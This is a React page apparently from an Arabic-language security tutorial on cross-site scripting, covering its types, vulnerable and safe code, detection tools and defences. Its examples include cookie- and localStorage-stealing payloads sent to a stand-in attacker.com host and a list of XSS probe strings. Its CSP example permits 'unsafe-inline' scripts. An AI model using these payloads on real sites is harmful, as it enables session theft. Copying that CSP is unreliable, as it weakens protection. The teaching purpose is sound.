import Link from 'next/link'
import VideoSection from '@/components/VideoSection'

export default function XssPage() {
  return (
    <div className="max-w-4xl mx-auto prose prose-lg" dir="rtl">
      <section className="mb-12">
        <div className="flex items-center gap-3 mb-4">
          <span className="text-5xl">&#x1F4DC;</span>
          <div>
            <h1 className="text-4xl font-bold text-gray-900 mb-0">برمجة نصوص بين المواقع</h1>
            <p className="text-xl text-gray-500 mt-1">Cross-Site Scripting (XSS)</p>
          </div>
        </div>
        <div className="bg-danger-50 border border-danger-200 rounded-lg p-4 mb-6">
          <p className="text-danger-700 font-semibold mb-0">
            &#x26A0; مستوى الخطورة: عالي
          </p>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">تعريف XSS</h2>
        <p>
          برمجة نصوص بين المواقع (XSS) هي ثغرة أمنية تسمح للمهاجم بحقن أكواد JavaScript ضارة في صفحات الويب التي يراها المستخدمون الآخرون. يستخدم المهاجم هذه الثغرة لسرقة بيانات المستخدمين أو تشويه المواقع أو تثبيت برامج ضارة.
        </p>
        <p>
          تحدث XSS عندما تقوم تطبيقات الويب بعرض بيانات المستخدم دون تنقية كافية، مما يسمح للمهاجم بحقن أكواد ضارة يتم تنفيذها في متصفح الضحية.
        </p>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">أنواع XSS</h2>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3">1. XSS المنعكس (Reflected XSS)</h3>
          <p>
            يحدث عندما يتم حقن الكود الضار في طلب HTTP (مثل URL أو نموذج) ويتم عرضه في استجابة الخادم دون تنقية. يتطلب المهاجم إقناع الضحية بالنقر على رابط مغرض.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`// مثال على رابط مغرض
https://example.com/search?q=<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>

// عندما يفتح الضحية الرابط، يتم تنفيذ الكود الضار`}
            </pre>
          </div>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3">2. XSS المخزن (Stored XSS)</h3>
          <p>
            يحدث عندما يتم تخزين الكود الضار في قاعدة البيانات (مثل تعليقات أو منشورات) ويتم عرضه لكل مستخدم يزور الصفحة. هذا النوع أكثر خطورة لأنه لا يتطلب تفاعلاً من الضحية.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`// مثال على تعليق مغرض
&lt;script&gt;
  // كود لسرقة بيانات المستخدمين
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage)
    })
  });
&lt;/script&gt;

// إذا لم يتم تنقية التعليق، سيراه كل من يزور الصفحة`}
            </pre>
          </div>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3">3. DOM-based XSS</h3>
          <p>
            يحدث عندما يتم تعديل DOM بواسطة JavaScript في العميل دون تدخل الخادم. الكود الضار يتم حقنه في URL ويتم معالجته بواسطة JavaScript في الصفحة.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`// كود مصاب في الصفحة
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = 'مرحباً ' + name;

// مثال على URL مغرض
https://example.com/greeting?name=<img src=x onerror=alert('XSS')>`}
            </pre>
          </div>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">أمثلة على الكود المصاب والمحصن</h2>

        <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-danger-700 mb-3">&#x274C; كود مصاب</h3>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg">
            <pre className="text-sm">
{`// عرض تعليقات المستخدمين بدون تنقية
element.innerHTML = userInput;

// استخدام eval على مدخلات المستخدم
eval(userInput);

// إنشاء روابط ديناميكية من مدخلات المستخدم
element.href = "javascript:" + userInput;`}
            </pre>
          </div>
        </div>

        <div className="bg-success-50 border border-success-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-success-700 mb-3">&#x2705; كود محصن</h3>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg">
            <pre className="text-sm">
{`// استخدام textContent بدلاً من innerHTML
element.textContent = userInput;

// استخدام DOMPurify لتنقية HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// استخدام CORS آمن
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'
  },
  credentials: 'same-origin'
});`}
            </pre>
          </div>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">كيف تكتشف ثغرات XSS</h2>

        <h3 className="text-xl font-bold text-gray-800 mb-3">علامات الضعف</h3>
        <ul className="list-disc mr-6 mb-4">
          <li>ظهور نوافذ منبثقة (alert) عند إدخال أكواد في النماذج</li>
          <li>تشويه الصفحة بعد إدخال أكواد HTML</li>
          <li>تنفيذ أكواد JavaScript غير متوقعة</li>
          <li>سرقة ملفات تعريف الارتباط (cookies)</li>
        </ul>

        <h3 className="text-xl font-bold text-gray-800 mb-3">أدوات الاكتشاف</h3>
        <ul className="list-disc mr-6 mb-4">
          <li><strong>Burp Suite</strong> - أداة شاملة لاختبار أمن تطبيقات الويب</li>
          <li><strong>OWASP ZAP</strong> - أداة مجانية لاكتشاف الثغرات</li>
          <li><strong>XSStrike</strong> - أداة متخصصة في اكتشاف XSS</li>
          <li><strong>Dalfox</strong> - أداة سريعة لاكتشاف XSS</li>
        </ul>

        <h3 className="text-xl font-bold text-gray-800 mb-3">أكواد اختبار XSS</h3>
        <div className="bg-gray-900 text-gray-100 p-4 rounded-lg">
          <pre className="text-sm">
{`// أكواد اختبار XSS الأساسية
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>`}
          </pre>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">طرق الحماية</h2>

        <div className="space-y-6">
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
            <h3 className="text-xl font-bold text-gray-800 mb-3">1. تنقية المخرجات (Output Encoding)</h3>
            <p>
              ت:convert جميع الأحرف الخاصة إلى نظائرها الآمنة HTML قبل عرضها. هذا يمنع المتصفح من تفسير المدخلات ككود.
            </p>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
              <pre className="text-sm">
{`// في JavaScript
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// استخدام الدالة
element.textContent = escapeHtml(userInput);`}
              </pre>
            </div>
          </div>

          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
            <h3 className="text-xl font-bold text-gray-800 mb-3">2. سياسة أمان المحتوى (CSP)</h3>
            <p>
              تحدد CSP المواقع المسموح بها لتحميل الموارد منها، مما يمنع تنفيذ أكواد JavaScript من مصادر غير موثوقة.
            </p>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
              <pre className="text-sm">
{`// إعداد CSP في Node.js/Express
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "font-src 'self'",
    "connect-src 'self'",
    "frame-ancestors 'none'"
  ].join('; '));
  next();
});`}
              </pre>
            </div>
          </div>

          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
            <h3 className="text-xl font-bold text-gray-800 mb-3">3. استخدام أطر عمل آمنة</h3>
            <p>
              أطر العمل الحديثة مثل React و Vue و Angular تقوم تنقية المخرجات تلقائياً. تجنب استخدام innerHTML.
            </p>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
              <pre className="text-sm">
{`// React - آمن بشكل افتراضي
function UserComment({ text }) {
  // React ينقّي النص تلقائياً
  return <div>{text}</div>;
}

// لكن تجنب استخدام dangerouslySetInnerHTML
// إلا مع DOMPurify
import DOMPurify from 'dompurify';

function SafeHTML({ html }) {
  return (
    <div dangerouslySetInnerHTML={{
      __html: DOMPurify.sanitize(html)
    }} />
  );
}`}
              </pre>
            </div>
          </div>

          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
            <h3 className="text-xl font-bold text-gray-800 mb-3">4. HttpOnly Cookies</h3>
            <p>
              اجعل ملفات تعريف الارتباط الحساسة غير قابلة للوصول بواسطة JavaScript، مما يمنع سرقتها حتى في حالة وجود XSS.
            </p>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
              <pre className="text-sm">
{`// في Node.js
res.cookie('sessionId', sessionId, {
  httpOnly: true,  // غير قابل للوصول من JavaScript
  secure: true,    // HTTPS فقط
  sameSite: 'strict',  // حماية CSRF
  maxAge: 24 * 60 * 60 * 1000  // يوم واحد
});`}
              </pre>
            </div>
          </div>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">نصائح أمنية</h2>
        <div className="bg-success-50 border border-success-200 rounded-lg p-6">
          <ul className="space-y-3">
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span><strong>القاعدة الذهبية:</strong> لا تثق أبداً بمدخلات المستخدم</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>استخدم textContent بدلاً من innerHTML</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>فعّل CSP (Content Security Policy) في خادمك</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>استخدم أطر عمل آمنة مثل React أو Vue</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>استخدم DOMPurify لتنقية HTML الديناميكي</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>اجعل الكوكيز الحساسة HttpOnly و Secure</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>راجع الكود بشكل دوري وقم باختبارات أمان</span>
            </li>
          </ul>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">الأخطاء الشائعة</h2>
        <div className="space-y-4">
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-700 mb-2">&#x274C; استخدام innerHTML مع مدخلات المستخدم</h4>
            <p className="text-gray-600 mb-0">هذا يسمح بحقن أي كود HTML أو JavaScript</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-700 mb-2">&#x274C; عدم تفعيل CSP</h4>
            <p className="text-gray-600 mb-0">بدون CSP، يمكن تحميل أكواد من أي مصدر</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-700 mb-2">&#x274C; استخدام eval() مع مدخلات المستخدم</h4>
            <p className="text-gray-600 mb-0">يسمح بتنفيذ أي كود JavaScript عشوائي</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-700 mb-2">&#x274C; عدم تنقية مخرجات البحث</h4>
            <p className="text-gray-600 mb-0">صفحات البحث عادة ما تعكس مدخلات المستخدم مباشرة</p>
          </div>
        </div>
      </section>

      <section className="mb-12">
        <VideoSection slug="xss" />
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">الثغرات الأخرى</h2>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Link href="/vulnerabilities/sql-injection" className="block bg-gray-50 border border-gray-200 rounded-lg p-4 hover:shadow-md transition">
            <span className="text-2xl">&#x1F489;</span>
            <h4 className="font-bold mt-2">حقن SQL</h4>
          </Link>
          <Link href="/vulnerabilities/csrf" className="block bg-gray-50 border border-gray-200 rounded-lg p-4 hover:shadow-md transition">
            <span className="text-2xl">&#x1F3A3;</span>
            <h4 className="font-bold mt-2">CSRF</h4>
          </Link>
          <Link href="/vulnerabilities/ssrf" className="block bg-gray-50 border border-gray-200 rounded-lg p-4 hover:shadow-md transition">
            <span className="text-2xl">&#x1F5A5;&#xFE0F;</span>
            <h4 className="font-bold mt-2">SSRF</h4>
          </Link>
        </div>
      </section>
    </div>
  )
}
